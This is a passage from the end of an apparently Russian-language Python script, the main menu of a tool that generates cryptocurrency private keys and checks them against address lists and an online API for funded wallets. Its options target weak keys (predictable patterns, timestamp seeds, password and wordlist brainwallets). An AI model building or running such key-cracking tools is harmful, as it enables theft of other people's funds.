        async with aiohttp.ClientSession() as session:
            method = choose_generation_method()  # Должно отобразить меню
            check_mode, file_paths, addresses_set = await choose_check_mode()
            group = prefix = suffix = vulnerable_type = password_file = timestamp = None

            if method == 2:
                prefix, suffix = choose_vanity_pattern()
            elif method == 3:
                group = choose_group()
            elif method == 4:
                password_file = input(Fore.CYAN + "Введите путь к файлу со списком слов для мнемонических фраз (или нажмите Enter для стандартной генерации): " + Style.RESET_ALL).strip()
                if password_file and not os.path.exists(password_file):
                    print(Fore.RED + f"Файл {password_file} не найден." + Style.RESET_ALL)
                    logger.error(f"Файл слов {password_file} не найден.")
                    return
            elif method == 5:
                print(Fore.CYAN + "Выберите тип уязвимого ключа:" + Style.RESET_ALL)
                print(Fore.CYAN + "1. Повторяющиеся символы" + Style.RESET_ALL)
                print(Fore.CYAN + "2. Полуслучайные последовательности" + Style.RESET_ALL)
                print(Fore.CYAN + "3. Предсказуемые паттерны" + Style.RESET_ALL)
                vulnerable_type = int(input(Fore.CYAN + "Введите номер типа (1-3): " + Style.RESET_ALL))
                if vulnerable_type not in [1, 2, 3]:
                    print(Fore.RED + "Неверный выбор." + Style.RESET_ALL)
                    return
            elif method == 6:
                timestamp_input = input(Fore.CYAN + "Введите дату (ГГГГ-ММ-ДД) или нажмите Enter для текущей: " + Style.RESET_ALL)
                if timestamp_input:
                    try:
                        timestamp = int(datetime.datetime.strptime(timestamp_input, '%Y-%m-%d').timestamp())
                    except ValueError:
                        print(Fore.RED + "Неверный формат даты. Используется текущая." + Style.RESET_ALL)
                        timestamp = int(datetime.datetime.now().timestamp())
                else:
                    timestamp = int(datetime.datetime.now().timestamp())
                last_timestamp = timestamp
            elif method == 9:
                password_file = input(Fore.CYAN + "Введите путь к файлу со списком паролей: " + Style.RESET_ALL).strip()
                if not os.path.exists(password_file):
                    print(Fore.RED + f"Файл {password_file} не найден." + Style.RESET_ALL)
                    logger.error(f"Файл паролей {password_file} не найден.")
                    return

            mode_names = {1: "Online", 2: "Online+File", 3: "File"}
            print(Fore.CYAN + f"Генерация методом {method}, режим: {mode_names[check_mode]}" + Style.RESET_ALL)
            logger.info(f"Генерация методом {method}, режим: {mode_names[check_mode]}")

            try:
                await generate_keys(
                    method, check_mode, addresses_set, file_paths, session,
                    group=group, prefix=prefix, suffix=suffix,
                    vulnerable_type=vulnerable_type, password_file=password_file, timestamp=timestamp
                )
                # Для методов 4 и 9: завершение программы после обработки всех слов/паролей
                if method in [4, 9] and password_file:
                    print(Fore.GREEN + f"Все {'слова' if method == 4 else 'пароли'} из файла обработаны. Завершение программы." + Style.RESET_ALL)
                    logger.info(f"Все {'слова' if method == 4 else 'пароли'} из файла обработаны. Завершение программы.")
                    save_state(0, 0)  # Сбрасываем состояние
                    await save_stats(method, mode_names[check_mode], group)
                    print(Fore.GREEN + f"Обработано ключей: {stats['keys_generated']}" + Style.RESET_ALL)
                    print(Fore.GREEN + f"Совпадений (файл): {stats['matches_file']}" + Style.RESET_ALL)
                    print(Fore.GREEN + f"Совпадений (API): {stats['matches_api']}" + Style.RESET_ALL)
                    print(Fore.GREEN + f"Адресов с балансом: {stats['addresses_with_balance']}" + Style.RESET_ALL)
                    exit(0)
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\nОстановка программы..." + Style.RESET_ALL)
                logger.info("Программа остановлена пользователем.")
                save_state(stats['keys_generated'])
                await save_stats(method, mode_names[check_mode], group)
                print(Fore.GREEN + f"Обработано ключей: {stats['keys_generated']}" + Style.RESET_ALL)
                print(Fore.GREEN + f"Совпадений (файл): {stats['matches_file']}" + Style.RESET_ALL)
                print(Fore.GREEN + f"Совпадений (API): {stats['matches_api']}" + Style.RESET_ALL)
                print(Fore.GREEN + f"Адресов с балансом: {stats['addresses_with_balance']}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"Ошибка в генерации ключей: {e}" + Style.RESET_ALL)
                logger.error(f"Ошибка в генерации ключей: {e}")
                save_state(stats['keys_generated'])
                await save_stats(method, mode_names[check_mode], group)
    except Exception as e:
        print(Fore.RED + f"Критическая ошибка при запуске программы: {e}" + Style.RESET_ALL)
        logger.error(f"Критическая ошибка при запуске программы: {e}")
        exit(1)
if __name__ == "__main__":
    asyncio.run(main())        